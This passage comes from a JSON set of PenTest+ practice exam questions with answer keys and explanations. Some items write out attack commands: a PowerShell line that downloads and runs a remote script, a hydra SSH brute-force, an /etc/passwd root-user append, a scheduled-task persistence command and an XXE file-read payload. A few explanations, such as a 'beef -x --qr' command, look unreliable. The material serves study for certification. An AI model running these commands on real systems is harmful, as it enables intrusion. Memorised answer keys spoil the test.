    "question_text": "Given the following script:\n\n$1 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.split(\"\\\")[1]\n\nIf ($1 -eq \"administrator\") {\n\necho IEX(New-Object Net.WebClient).Downloadstring('http://10.10.11.12:8080/ul/windows.ps1') | \npowershell -noprofile -}\n\nWhich of the following is the penetration tester most likely trying to do?",
    "options": {
      "A": "Change the system's wallpaper based on the current user's preferences.",
      "B": "Capture the administrator's password and transmit it to a remote server.",
      "C": "Conditionally stage and execute a remote script.",
      "D": "Log the internet browsing history for a systems administrator."
    },
    "correct_answer": "C",
    "explanation": "Script Breakdown:\n\n$1 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.split(\"\\\")[1]: Retrieves \nthe current username.\n\nIf ($1 -eq \"administrator\"): Checks if the current user is \"administrator\".\n\necho IEX(New-Object Net.WebClient).Downloadstring('http://10.10.11.12:8080/ul/windows.ps1\n') | powershell -noprofile -}: If the user is \"administrator\", downloads and executes a PowerShell \nscript from a remote server.\n\nPurpose:\n\nConditional Execution: Ensures the script runs only if executed by an administrator.\n\nRemote Script Execution: Uses IEX (Invoke-Expression) to download and execute a script from a \nremote server, a common method for staging payloads.\n\nWhy This is the Best Choice:\n\nThis script aims to conditionally download and execute a remote script based on the user's \nprivileges. It is designed to stage further attacks or payloads only if the current user has \nadministrative privileges.\n\nReferences from Pentesting Literature:\n\nThe technique of conditionally executing scripts based on user privileges and using remote script \nexecution is discussed in penetration testing guides and is a common tactic in various HTB write ups.",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
{
    "question_number": 65,
    "question_text": "A penetration tester assesses an application allow list and has limited command-line access on the Windows system. Which of the following would give the penetration tester information that could aid in continuing the test?",
    "options": {
    "A": "mmc.exe",
    "B": "icacls.exe",
    "C": "nltest.exe",
    "D": "rundll.exe"
    },
    "correct_answer": "C",
    "explanation": "When a penetration tester has limited command-line access on a Windows system, the choice of tool is critical \nfor gathering information to aid in furthering the test. Here’s an explanation for each option:\n\nmmc.exe (Microsoft Management Console):\n\nPrimarily used for managing Windows and its services. It’s not typically useful for gathering \ninformation about the system from the command line in a limited access scenario.\n\nicacls.exe:\n\nThis tool is used for modifying file and folder permissions. While useful for modifying security \nsettings, it does not directly aid in gathering system information or enumeration.\n\nnltest.exe:\n\nThis is a powerful command-line utility for network testing and gathering information about \ndomain controllers, trusts, and replication status. Key functionalities include:\n\nListing domain controllers: nltest /dclist:<DomainName>\n\nQuerying domain trusts: nltest /domain_trusts\n\nChecking secure channel: nltest /sc_query:<DomainName>\n\nThese capabilities make nltest very useful for understanding the network environment, especially \nin a domain context, which is essential for penetration testing.\n\nrundll.exe:\n\nThis utility is used to run DLLs as programs. While it can be used for executing code, it does not \nprovide direct information about the system or network environment.\n\nConclusion: nltest.exe is the best choice among the given options as it provides valuable information about \nthe network, domain controllers, and trust relationships. This information is crucial for a penetration tester to \nplan further actions and understand the domain environment.\n=================",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 228,
    "question_text": "A previous penetration test report identified a host with vulnerabilities that was successfully exploited. Management has requested that an internal member of the security team reassess the host to determine if the vulnerability still exists.\n\n[Image showing Nmap scan results (SSH, HTTP, RPCBind, Samba open) and enum4linux output listing users including 'lowpriv'.]\n\nPart 1: Analyze the output and select the command to exploit the vulnerable service.\n[Radio button options for exploitation commands: medusa, hydra, crowbar, ncrack targeting various services like rpcbind, rdp, ssh]\n\nPart 2:\nAnalyze the output from each command.\n[Tabs showing outputs for commands like `find / -perm -2`, `find / -perm -u=s`, `grep /bin/bash /etc/passwd`, `echo ... >> /etc/passwd`, `openssl passwd`, `chmod u-s /bin/cp`, etc.]\nSelect the appropriate set of commands to escalate privileges.\n[Radio button options showing different commands for privilege escalation, like modifying /etc/passwd, using openssl passwd, etc.]\nIdentify which remediation steps should be taken.\n[Checkbox options for remediation: Remove no_root_squash, Encrypt /etc/passwd, Update SSH, Strengthen lowpriv password, Make backup script not world-writable, Remove SUID bit from cp]",
    "options": null,
    "correct_answer": null,
    "explanation": "The command that would most likely exploit the services is:\nhydra -l lowpriv -P 500-worst-passwords.txt -t 4 ssh://192.168.10.2:22\n\nThe appropriate set of commands to escalate privileges is:\necho \"root2:5ZOYXRFHVZ7OY::0:0:root:/root:/bin/bash\" >> /etc/passwd\n\nThe remediations that should be taken after the successful privilege escalation are:\nRemove the SUID bit from cp.\nMake backup script not world-writable.\n\nComprehensive Step-by-Step Explanation of the Simulation\nPart 1: Exploiting Vulnerable Service\nNmap Scan Analysis\nCommand: nmap -sC -T4 192.168.10.2\nPurpose: This command runs a default script scan with timing template 4 (aggressive).\nOutput:\n[...] Port State Service\n22/tcp open ssh\n[...] 80/tcp open http\n[...] 111/tcp closed rpcbind\n[...] 445/tcp open samba\n[...] Ports open are SSH (22), HTTP (80), and Samba (445).\n\nEnumerating Samba Shares\nCommand: enum4linux -S 192.168.10.2\nPurpose: To enumerate Samba shares and users.\nOutput:\n[...] user:[lowpriv] rid:[0x3fa]\nWe identify a user lowpriv.\n\nSelecting Exploit Command\nHydra Command: hydra -l lowpriv -P 500-worst-passwords.txt -t 4 ssh://192.168.10.2:22\nPurpose: To perform a brute force attack on SSH using the lowpriv user and a list of the 500 \nworst passwords.\nExplanation:\n-l lowpriv: Specifies the username.\n-P 500-worst-passwords.txt: Specifies the password list.\n-t 4: Uses 4 tasks/threads for the attack.\nssh://192.168.10.2:22: Specifies the SSH service and port.\n\nExecuting the Hydra Command\nResult: Successful login as lowpriv user if a match is found.\n\nPart 2: Privilege Escalation and Remediation\nFinding SUID Binaries and Configuration Files\nCommand: find / -perm -2 -type f 2>/dev/null | xargs ls -l\nPurpose: To find world-writable files.\nCommand: find / -perm -u=s -type f 2>/dev/null | xargs ls -l\nPurpose: To find files with SUID permission.\nCommand: grep \"/bin/bash\" /etc/passwd | cut -d':' -f1-4,6,7\nPurpose: To identify users with bash shell access.\n\nSelecting Privilege Escalation Command\nCommand: echo \"root2:5ZOYXRFHVZ7OY::0:0:root:/root:/bin/bash\" >> /etc/passwd\nPurpose: To create a new root user entry in the passwd file.\nExplanation:\nroot2: Username.\n5ZOYXRFHVZ7OY: Password hash.\n::0:0: User and group ID (root).\n/root: Home directory.\n/bin/bash: Default shell.\n\nExecuting the Privilege Escalation Command\nResult: Creation of a new root user root2 with a specified password.\n\nRemediation Steps Post-Exploitation\nRemove SUID Bit from cp:\nCommand: chmod u-s /bin/cp\nPurpose: Removing the SUID bit from cp to prevent misuse.\nMake Backup Script Not World-Writable:\nCommand: chmod o-w /path/to/backup/script\nPurpose: Ensuring backup script is not writable by all users to prevent unauthorized \nmodifications.\n\nExecution and Verification\nVerifying Hydra Attack:\nRun the Hydra command and monitor for successful login attempts.\nVerifying Privilege Escalation:\nAfter appending the new root user to the passwd file, attempt to switch user to root2 and check \nroot privileges.\nImplementing Remediation:\nApply the remediation commands to secure the system and verify the changes have been \nimplemented.\n\nBy following these detailed steps, one can replicate the simulation and ensure a thorough understanding of \nboth the exploitation and the necessary remediations.",
    "is_simulation": true,
    "simulation_details": "Multi-part simulation. Part 1: Select exploit command via radio button based on Nmap/enum4linux output. Part 2: Given command outputs (find, grep), select privilege escalation command via radio button and select appropriate remediation steps via checkboxes.",
    "domain": "4.0 Attacks and Exploits",
    "question_type": "simulation"
},
{
    "question_number": 175,
    "question_text": "While conducting an assessment, a penetration tester identifies the details for several unreleased products announced at a company-wide meeting. Which of the following attacks did the tester most likely use to discover this information?",
    "options": {
    "A": "Eavesdropping",
    "B": "Bluesnarfing",
    "C": "Credential harvesting",
    "D": "SQL injection attack"
    },
    "correct_answer": "A",
    "explanation": "Eavesdropping:\n\nEavesdropping involves intercepting communications between parties without their consent. If \nthe details were obtained from a meeting, it likely involved intercepting audio or network \ncommunications, such as unsecured VoIP calls, radio signals, or in-room microphones.\n\nWhy Not Other Options?\n\nB (Bluesnarfing): Targets Bluetooth-enabled devices, which is unlikely to apply to general \nmeeting communications.\n\nC (Credential harvesting): Focuses on collecting user credentials and does not explain the \ndiscovery of product details from a meeting.\n\nD (SQL injection): Exploits databases and is unrelated to capturing meeting communication.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nTechniques for Intercepting Communication",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 171,
    "question_text": "During a security assessment for an internal corporate network, a penetration tester wants to gain unauthorized access to internal resources by executing an attack that uses software to disguise itself as legitimate software. Which of the following host-based attacks should the tester use?",
    "options": {
    "A": "On-path",
    "B": "Logic bomb",
    "C": "Rootkit",
    "D": "Buffer overflow"
    },
    "correct_answer": "C",
    "explanation": "A rootkit is a type of malicious software designed to provide an attacker with unauthorized access to a \ncomputer system while concealing its presence. Rootkits achieve this by modifying the host’s operating \nsystem or other software to hide their existence, allowing the attacker to maintain control over the system \nwithout detection.\n\nDefinition and Purpose:\n\nRootkits are primarily used to gain and maintain root access (administrative privileges) on a \nsystem.\n\nThey disguise themselves as legitimate software or integrate deeply into the operating system to \navoid detection.\n\nMechanisms of Action:\n\nKernel Mode Rootkits: These operate at the kernel level, which is the core of the operating \nsystem, making them very powerful and hard to detect.\n\nUser Mode Rootkits: These run in the same space as user applications, intercepting and altering \nstandard system API calls to hide their presence.\n\nBootkits: These infect the Master Boot Record (MBR) or Volume Boot Record (VBR) and load \nbefore the operating system, making them extremely difficult to detect and remove.\n\nDetection and Prevention:\n\nDetection Tools: Tools like RootkitRevealer, Chkrootkit, and rkhunter can help in identifying \nrootkits.\n\nPrevention: Regular system updates, use of strong antivirus and anti-malware solutions, and \nintegrity checking tools like Tripwire can help in preventing rootkit infections.\n\nReal-World Examples:\n\nSony BMG Rootkit: In 2005, Sony BMG included a rootkit in their digital rights management \n(DRM) software on music CDs. The rootkit hid files and processes, leading to a major scandal \nwhen it was discovered.\n\nStuxnet: This sophisticated worm included a rootkit component to hide its presence on infected \nsystems, making it one of the most infamous examples of rootkit use in a cyber attack.\n\nReferences from Pentesting Literature:\n\nIn \"Penetration Testing - A Hands-on Introduction to Hacking\" by Georgia Weidman, rootkits are \ndiscussed in the context of post-exploitation, where maintaining access to the compromised \nsystem is crucial.\n\nVarious HTB write-ups, such as the analysis of complex attacks involving multiple stages of \nexploitation, often highlight the use of rootkits in maintaining persistent access.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups on sophisticated attacks\n=================",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 20,
    "question_text": "During a red-team exercise, a penetration tester obtains an employee's access badge. The tester uses the badge's information to create a duplicate for unauthorized entry. Which of the following best describes this action?",
    "options": {
    "A": "Smurfing",
    "B": "Credential stuffing",
    "C": "RFID cloning",
    "D": "Card skimming"
    },
    "correct_answer": "C",
    "explanation": "RFID Cloning:\n\nRFID (Radio-Frequency Identification) cloning involves copying the data from an access badge \nand creating a duplicate that can be used for unauthorized entry.\n\nTools like Proxmark or RFID duplicators are commonly used for this purpose.\n\nWhy Not Other Options?\n\nA (Smurfing): A network-based denial-of-service attack, unrelated to physical access.\n\nB (Credential stuffing): Involves using stolen credentials in bulk for authentication attempts, \nunrelated to badge cloning.\n\nD (Card skimming): Relates to stealing credit card information, not access badges.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 132,
    "question_text": "A penetration tester reviews a SAST vulnerability scan report. The following vulnerability has been reported as high severity:\nSource file: components.ts\nIssue 2 of 12: Command injection\nSeverity: High\nCall: .innerHTML = response\nThe tester inspects the source file and finds the variable response is defined as a constant and is not referred to or used in other sections of the code. Which of the following describes how the tester should classify this reported vulnerability?",
    "options": {
    "A": "False negative",
    "B": "False positive",
    "C": "True positive",
    "D": "Low severity"
    },
    "correct_answer": "B",
    "explanation": "A false positive occurs when a vulnerability scan incorrectly flags a security issue that does not exist or is not \nexploitable in the context of the application. Here's the reasoning:\n\nDefinition of Command Injection:Command injection vulnerabilities occur when user-controllable data \nis passed to an interpreter or command execution context without proper sanitization, allowing an \nattacker to execute arbitrary commands.\n\nCode Analysis:\n\nThe response variable is defined as a constant (const), which implies its value is immutable \nduring runtime.\n\nThe response is not sourced from user input nor used elsewhere, meaning there is no attack \nsurface or exploitation pathway for an attacker to influence the content of response.\n\nScanner Misclassification:Static Application Security Testing (SAST) tools may flag vulnerabilities \nbased on patterns (e.g., .innerHTML usage) without assessing the source and flow of data, resulting in \nfalse positives.\n\nFinal Classification:Since the response variable is static and unchangeable, the flagged issue is not \nexploitable. This makes it a false positive.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nDomain 4.0 (Penetration Testing Tools)\n\nOWASP Static Code Analysis Guide",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 114,
    "question_text": "A penetration tester wants to maintain access to a compromised system after a reboot. Which of the following techniques would be best for the tester to use?",
    "options": {
    "A": "Establishing a reverse shell",
    "B": "Executing a process injection attack",
    "C": "Creating a scheduled task",
    "D": "Performing a credential-dumping attack"
    },
    "correct_answer": "C",
    "explanation": "To maintain persistence after a reboot, the tester needs a method that automatically restarts when the system \nreboots.\n\nOption A (Reverse shell) #: Reverse shells do not persist after a reboot unless paired with scheduled \ntasks or registry modifications.\n\nOption B (Process injection) #: Injecting into a process is temporary—once the system reboots, the \ninjected process is gone.\n\nOption C (Scheduled task) #: Correct.\n\nA scheduled task can execute malware, reverse shells, or scripts on system startup, ensuring \npersistence.\n\nExample:\n\nschtasks /create /sc onlogon /tn \"SystemUpdate\" /tr \"C:\\malicious.exe\"\n\nOption D (Credential dumping) #: While useful for privilege escalation, it does not provide persistence.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Persistence Techniques",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 188,
    "question_text": "A penetration testing team needs to determine whether it is possible to disrupt wireless communications for PCs deployed in the client’s offices. Which of the following techniques should the penetration tester leverage?",
    "options": {
    "A": "Port mirroring",
    "B": "Sidecar scanning",
    "C": "ARP poisoning",
    "D": "Channel scanning"
    },
    "correct_answer": "D",
    "explanation": "To assess wireless communication disruptions, channel scanning is used to identify active Wi-Fi channels, \nallowing testers to target specific frequencies for jamming or deauthentication attacks.\n\nOption A (Port mirroring) #: Used for network traffic monitoring, not wireless disruption.\n\nOption B (Sidecar scanning) #: Not a commonly used technique in wireless testing.\n\nOption C (ARP poisoning) #: Used to manipulate ARP tables on wired networks, not for wireless \ninterference.\n\nOption D (Channel scanning) #: Correct.\n\nIdentifies which Wi-Fi channels are in use.\n\nHelps perform jamming, deauthentication, or interference attacks.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Wireless Attacks and Security Testing",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 172,
    "question_text": "A penetration tester needs to confirm the version number of a client's web application server. Which of the following techniques should the penetration tester use?",
    "options": {
    "A": "SSL certificate inspection",
    "B": "URL spidering",
    "C": "Banner grabbing",
    "D": "Directory brute forcing"
    },
    "correct_answer": "C",
    "explanation": "Banner grabbing is a technique used to obtain information about a network service, including its version \nnumber, by connecting to the service and reading the response.\n\nUnderstanding Banner Grabbing:\n\nPurpose: Identify the software version running on a service by reading the initial response banner.\n\nMethods: Can be performed manually using tools like Telnet or automatically using tools like \nNmap.\n\nManual Banner Grabbing:\n\nStep-by-Step Explanationtelnet target_ip 80\n\nNetcat: Another tool for banner grabbing.\n\nnc target_ip 80\n\nAutomated Banner Grabbing:\n\nNmap: Use Nmap’s version detection feature to grab banners.\n\nnmap -sV target_ip\n\nBenefits:\n\nInformation Disclosure: Quickly identify the version and sometimes configuration details of the \nservice.\n\nTargeted Exploits: Helps in selecting appropriate exploits based on the identified version.\n\nReferences from Pentesting Literature:\n\nBanner grabbing is a fundamental technique in reconnaissance, discussed in various penetration \ntesting guides.\n\nHTB write-ups often include banner grabbing as a step in identifying the version of services.",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 207,
    "question_text": "A penetration tester needs to evaluate the order in which the next systems will be selected for testing. Given the following output: [Table showing Hostname, IP Address, CVSS 2.0, EPSS for fileserver(7.6, 0.90), hrdatabase(9.9, 0.50), legaldatabase(8.2, 0.60), financesite(8.0, 0.01)]\nWhich of the following targets should the tester select next?",
    "options": {
    "A": "fileserver",
    "B": "hrdatabase",
    "C": "legaldatabase",
    "D": "financesite"
    },
    "correct_answer": "A",
    "explanation": "Evaluation Criteria:\n\nCVSS (Common Vulnerability Scoring System): Indicates the severity of vulnerabilities, with \nhigher scores representing more critical vulnerabilities.\n\nEPSS (Exploit Prediction Scoring System): Estimates the likelihood of a vulnerability being \nexploited in the wild.\n\nAnalysis:\n\nhrdatabase: CVSS = 9.9, EPSS = 0.50\n\nfinancesite: CVSS = 8.0, EPSS = 0.01\n\nlegaldatabase: CVSS = 8.2, EPSS = 0.60\n\nfileserver: CVSS = 7.6, EPSS = 0.90\n\nSelection Justification:\n\nfileserver has the highest EPSS score of 0.90, indicating a high likelihood of exploitation despite \nhaving a slightly lower CVSS score compared to other targets.\n\nThis makes it a critical target for immediate testing to mitigate potential exploitation risks.\n\nPentest References:\n\nRisk Prioritization: Balancing between severity (CVSS) and exploitability (EPSS) is crucial for \neffective vulnerability management.\n\nRisk Assessment: Evaluating both the impact and the likelihood of exploitation helps in making \ninformed decisions about testing priorities.\n\nBy selecting the fileserver, the penetration tester focuses on a target that is highly likely to be exploited, \naddressing the most immediate risk based on the given scores.",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
},
{
    "question_number": 185,
    "question_text": "Which of the following is most important when communicating the need for vulnerability remediation to a client at the conclusion of a penetration test?",
    "options": {
    "A": "Articulation of cause",
    "B": "Articulation of impact",
    "C": "Articulation of escalation",
    "D": "Articulation of alignment"
    },
    "correct_answer": "B",
    "explanation": "When concluding a penetration test, effectively communicating the need for vulnerability remediation is \ncrucial. Here’s why the articulation of impact is the most important aspect:\n\nArticulation of Cause (Option A):\n\nExplanation: This involves explaining the root cause of the vulnerabilities discovered during the \npenetration test.\n\nImportance: While understanding the cause is essential for long-term remediation and prevention, \nit does not directly convey the urgency or potential consequences of the vulnerabilities.\n\nArticulation of Impact (Option B):\n\nExplanation: This involves describing the potential consequences and risks associated with the \nvulnerabilities. It includes the possible damage, such as data breaches, financial losses, \nreputational damage, and operational disruptions.\n\nImportance: The impact provides the client with a clear understanding of the severity and urgency \nof the issues. It helps prioritize remediation efforts based on the potential damage that could be \ninflicted if the vulnerabilities are exploited.",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
},
  {
    "question_number": 221,
    "question_text": "Which of the following post-exploitation activities allows a penetration tester to maintain persistent access in a compromised system?",
    "options": {
      "A": "Creating registry keys",
      "B": "Installing a bind shell",
      "C": "Executing a process injection",
      "D": "Setting up a reverse SSH connection"
    },
    "correct_answer": "A",
    "explanation": "Maintaining persistent access in a compromised system is a crucial goal for a penetration tester after \nachieving initial access. Here’s an explanation of each option and why creating registry keys is the preferred \nmethod:\n\nCreating registry keys (Answer: A):\n\nExplanation: Modifying or adding specific registry keys can ensure that malicious code or \nbackdoors are executed every time the system starts, thus maintaining persistence.\n\nAdvantages: This method is stealthy and can be effective in maintaining access over long periods, \nespecially on Windows systems.\n\nExample: Adding a new entry to the HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \nregistry key to execute a malicious script upon system boot.",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 162,
    "question_text": "A penetration tester completes a scan and sees the following output on a host:\nbash\nCopy code\nNmap scan report for victim (10.10.10.10)\nHost is up (0.0001s latency)\nPORT STATE SERVICE\n161/udp open|filtered snmp\n445/tcp open microsoft-ds\n3389/tcp open microsoft-ds\nRunning Microsoft Windows 7\nOS CPE: cpe:/o:microsoft:windows_7_sp0\nThe tester wants to obtain shell access. Which of the following related exploits should the tester try first?",
    "options": {
      "A": "exploit/windows/smb/psexec",
      "B": "exploit/windows/smb/ms08_067_netapi",
      "C": "exploit/windows/smb/ms17_010_eternalblue",
      "D": "auxiliary/scanner/snmp/snmp_login"
    },
    "correct_answer": "C",
    "explanation": "The ms17_010_eternalblue exploit is the most appropriate choice based on the scenario.\n\nWhy MS17-010 EternalBlue?\n\nEternalBlue is a critical vulnerability in SMBv1 (port 445) affecting older versions of Windows, \nincluding Windows 7.\n\nThe exploit can be used to execute arbitrary code remotely, providing shell access to the target \nsystem.\n\nOther Options:\n\nA (psexec): This exploit is a post-exploitation tool that requires valid credentials to execute \ncommands remotely.\n\nB (ms08_067_netapi): A vulnerability targeting older Windows systems (e.g., Windows XP). It is \nunlikely to work on Windows 7.\n\nD (snmp_login): This is an auxiliary module for enumerating SNMP, not gaining shell access.\n\nCompTIA Pentest+ References:\n\nDomain 2.0 (Information Gathering and Vulnerability Identification)\n\nDomain 3.0 (Attacks and Exploits)",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 147,
    "question_text": "A penetration testing team needs to determine whether it is possible to disrupt the wireless communications for PCs deployed in the client's offices. Which of the following techniques should the penetration tester leverage?",
    "options": {
      "A": "Port mirroring",
      "B": "Sidecar scanning",
      "C": "ARP poisoning",
      "D": "Channel scanning"
    },
    "correct_answer": "D",
    "explanation": "Channel Scanning:\n\nWireless communications can be disrupted by identifying and interfering with the channels used \nby Wi-Fi networks.\n\nChannel scanning allows the tester to map all active Wi-Fi channels, identify the target network, \nand determine possible jamming or interference strategies.\n\nWhy Not Other Options?\n\nA (Port mirroring): This applies to wired network traffic duplication for monitoring purposes and \nis unrelated to wireless disruption.\n\nB (Sidecar scanning): Not a relevant technique in the context of wireless disruption.\n\nC (ARP poisoning): This targets Ethernet/IP communication in a local network, not wireless \ncommunication at the radio frequency level.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nWireless Network Disruption Techniques",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 218,
    "question_text": "During a penetration test, the tester uses a vulnerability scanner to collect information about any possible vulnerabilities that could be used to compromise the network. The tester receives the results and then executes the following command:\nsnmpwalk -v 2c -c public 192.168.1.23\nWhich of the following is the tester trying to do based on the command they used?",
    "options": {
      "A": "Bypass defensive systems to collect more information.",
      "B": "Use an automation tool to perform the attacks.",
      "C": "Script exploits to gain access to the systems and host.",
      "D": "Validate the results and remove false positives."
    },
    "correct_answer": "D",
    "explanation": "The command snmpwalk -v 2c -c public 192.168.1.23 is used to query SNMP (Simple Network Management \nProtocol) data from a device. Here’s the purpose in the context provided:\n\nSNMP Enumeration:\n\nFunction: snmpwalk is used to retrieve a large amount of information from the target device \nusing SNMP.\n\nVersion: -v 2c specifies the SNMP version.\n\nCommunity String: -c public specifies the community string, which is essentially a password for \nSNMP queries.\n\nPurpose of the Command:\n\nValidate Results: The tester uses SNMP to gather detailed information about the network devices \nto confirm the findings of the vulnerability scanner and remove any false positives.\n\nDetailed Information: SNMP can provide detailed information about device configurations, \nnetwork interfaces, and other settings that can validate the scanner’s results.\n\nComparison with Other Options:\n\nBypassing Defensive Systems (A): Not directly related to SNMP enumeration.\n\nUsing Automation Tools (B): While SNMPwalk is automated, the primary purpose here is \nvalidation.\n\nScript Exploits (C): SNMPwalk is not used for scripting exploits but for information gathering.\n\nBy using snmpwalk, the tester is validating the results from the vulnerability scanner and removing any false \npositives, ensuring accurate reporting.\n=================",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 7,
    "question_text": "A penetration tester wants to create a malicious QR code to assist with a physical security assessment. Which of the following tools has the built-in functionality most likely needed for this task?",
    "options": {
      "A": "BeEF",
      "B": "John the Ripper",
      "C": "ZAP",
      "D": "Evilginx"
    },
    "correct_answer": "A",
    "explanation": "BeEF (Browser Exploitation Framework) is a penetration testing tool that focuses on web browsers. It has \nbuilt-in functionality for generating malicious QR codes, which can be used to direct users to malicious \nwebsites, execute browser-based attacks, or gather information.\n\nUnderstanding BeEF:\n\nPurpose: BeEF is designed to exploit vulnerabilities in web browsers and gather information from \ncompromised browsers.\n\nFeatures: Includes tools for generating malicious payloads, QR codes, and social engineering \ntechniques.\n\nCreating Malicious QR Codes:\n\nFunctionality: BeEF has a feature to generate QR codes that, when scanned, redirect the user to a \nmalicious URL controlled by the attacker.\n\nCommand: Generate a QR code that directs to a BeEF hook URL.\nStep-by-Step Explanationbeef -x --qr\n\nUsage in Physical Security Assessments:\n\nDeployment: Place QR codes in strategic locations to test whether individuals scan them and \nsubsequently compromise their browsers.\n\nExploitation: Once scanned, the QR code can lead to browser exploitation, information gathering, \nor other payload execution.\n\nReferences from Pentesting Literature:\n\nBeEF is commonly discussed in penetration testing guides for its browser exploitation \ncapabilities.\n\nHTB write-ups and social engineering exercises often mention the use of BeEF for creating \nmalicious QR codes and exploiting browser vulnerabilities.",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 127,
    "question_text": "A penetration tester writes a Bash script to automate the execution of a ping command on a Class C network:\nbash\nfor var in —MISSING TEXT—\ndo\nping -c 1 192.168.10.$var\ndone\nWhich of the following pieces of code should the penetration tester use in place of the —MISSING TEXT— \nplaceholder?",
    "options": {
      "A": "crunch 1 254 loop",
      "B": "seq 1 254",
      "C": "echo 1-254",
      "D": "{1.-254}"
    },
    "correct_answer": "B",
    "explanation": "Correct Syntax for a Range Loop in Bash:\n\nThe seq command generates a sequence of numbers in a specified range, which is ideal for \niterating over IP addresses in a Class C subnet (1–254).\n\nExample: seq 1 254 will output numbers 1, 2, ..., 254 sequentially.\n\nExplanation of Other Options:\n\nA (crunch): The crunch command is used for wordlist generation and is unrelated to looping in \nBash.\n\nC (echo 1-254): This would output \"1-254\" as a string instead of generating a numeric range.\n\nD ({1.-254}): This is incorrect Bash syntax and would result in a script error.\n\nFinal Script:\n\nbash\nfor var in $(seq 1 254)\ndo\nping -c 1 192.168.10.$var\ndone\n\nCompTIA Pentest+ References:\n\nDomain 4.0 (Penetration Testing Tools)\n\nBash Scripting and Automation",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 170,
    "question_text": "During a red-team exercise, a penetration tester obtains an employee's access badge. The tester uses the badge’s information to create a duplicate for unauthorized entry.\nWhich of the following best describes this action?",
    "options": {
      "A": "Smurfing",
      "B": "Credential stuffing",
      "C": "RFID cloning",
      "D": "Card skimming"
    },
    "correct_answer": "C",
    "explanation": "RFID cloning involves copying data from an existing access card to create a duplicate badge. Attackers use \ntools like Proxmark3 or Flipper Zero to capture and replicate RFID signals.\n\nOption A (Smurfing) #: A DDoS attack technique, unrelated to physical security.\n\nOption B (Credential stuffing) #: Uses compromised usernames/passwords, not RFID badges.\n\nOption C (RFID cloning) #: Correct. Creates a duplicate access badge using RFID technology.\n\nOption D (Card skimming) #: Steals credit card data, but does not duplicate RFID badges.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Physical Security Testing & RFID Cloning",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 80,
    "question_text": "A penetration tester needs to launch an Nmap scan to find the state of the port for both TCP and UDP services. Which of the following commands should the tester use?",
    "options": {
      "A": "nmap -sU -sW -p 1-65535 example.com",
      "B": "nmap -sU -sY -p 1-65535 example.com",
      "C": "nmap -sU -sT -p 1-65535 example.com",
      "D": "nmap -sU -sN -p 1-65535 example.com"
    },
    "correct_answer": "C",
    "explanation": "To find the state of both TCP and UDP ports using Nmap, the appropriate command should combine both \nTCP and UDP scan options:\n\nUnderstanding the Options:\n\n-sU: Performs a UDP scan.\n\n-sT: Performs a TCP connect scan.\n\nCommand Explanation:\n\nCommand: nmap -sU -sT -p 1-65535 example.com\n\nExplanation: This command will scan both TCP and UDP ports from 1 to 65535 on the target \nexample.com. Combining -sU and -sT ensures that both types of services are scanned.\n\nComparison with Other Options:\n\n-sW: Initiates a TCP Window scan, not relevant for identifying the state of TCP and UDP \nservices.\n\n-sY: Initiates a SCTP INIT scan, not relevant for this context.\n\n-sN: Initiates a TCP Null scan, which is not used for discovering UDP services.\n=================",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 136,
    "question_text": "A penetration tester finds that an application responds with the contents of the /etc/passwd file when the following payload is sent:\n<?xml version=\"1.0\"?>\n<!DOCTYPE data [ <!ENTITY foo SYSTEM \"file:///etc/passwd\"> ]>\n<test>&foo;</test>\nWhich of the following should the tester recommend in the report to best prevent this type of vulnerability?",
    "options": {
      "A": "Drop all excessive file permissions with chmod o-rwx",
      "B": "Ensure the requests application access logs are reviewed frequently",
      "C": "Disable the use of external entities",
